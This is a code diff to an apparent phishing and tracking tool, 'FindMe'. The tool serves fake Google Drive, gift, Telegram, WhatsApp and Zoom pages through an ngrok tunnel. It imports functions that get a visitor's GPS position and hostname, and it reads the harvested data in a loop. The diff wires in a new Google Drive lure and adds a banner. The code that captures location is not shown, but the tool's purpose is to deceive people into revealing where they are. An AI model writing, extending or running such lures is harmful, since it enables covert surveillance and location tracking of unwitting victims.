@@ -7,7 +7,7 @@ import subprocess
 from python.track import open_result_file, get_gps_position, get_hostname
 
 TEMPLATE    = "views"
-DRIVE       = f'{TEMPLATE}/'
+DRIVE       = f'{TEMPLATE}/google_drive'
 GIFT        = f'{TEMPLATE}/'
 TOMBOLA     = f'{TEMPLATE}/'
 TELEGRAM    = f'{TEMPLATE}/telegram'
@@ -20,12 +20,7 @@ NGROK_LOG   = f'logs/ngrok_{date.today()}.log'
 IP          = f'127.0.0.1:{PORT}'
 global proccesss
 proccesss = []
-VERSION = '1.2.8'
-R = '\033[31m'  # red
-G = '\033[32m'  # green
-C = '\033[36m'  # cyan
-W = '\033[0m'   # white
-Y = '\033[33m'  # yellow
+VERSION = '1.0.0'
 NGROK_SERVER_URL = 'C:\\Users\\Kassoum\\Documents\\tools\\ngrok.exe'
 
 def killProcess(proccesss):
@@ -90,6 +85,11 @@ def read_data():
         else:
             time.sleep(5)
 
+def drive(choice):
+    start_local_server(DRIVE, choice)
+    time.sleep(2)
+    read_data()
+
 def telegran(choice):
     icon_file_name  = 'computer.jpg'
     group_name      = get_input('Enter group name')
@@ -134,7 +134,7 @@ def choose_server(template):
         choice = 1
     
     if template =='d':
-        return 'drive'
+        drive(choice)
     if template =='g':
         return 'g'
     if template =='t':
@@ -145,6 +145,13 @@ def choose_server(template):
         zoom(choice)
     
 if __name__ == '__main__':
+    banner = r"""
+     _____  _             _   __  __  _____ 
+    |  ___|(_) _ __    __| | |  \/  || ____|
+    | |_   | || '_ \  / _` | | |\/| ||  _|  
+    |  _|  | || | | || (_| | | |  | || |___
+    |_|    |_||_| |_| \__,_| |_|  |_||_____|
+    """
     try:
         parser = argparse.ArgumentParser()
         parser.add_argument('-d', '--drive', help='Google drive', action='store_true')
@@ -155,7 +162,7 @@ if __name__ == '__main__':
         args = parser.parse_args()
         
         clean_screen()
-
+        print(banner)
         if args.drive:
             choose_server('d')
         elif args.gift:
@@ -167,8 +174,7 @@ if __name__ == '__main__':
         elif args.zoom:
             choose_server('z')
         if args.drive is False and args.gift is False and args.telegran is False and args.whatsapp is False and args.zoom is False:
-            parser.print_help()
-        
+            parser.print_help()   
     except KeyboardInterrupt as e:
         print(f'User interruption........')
         killProcess(proccesss)
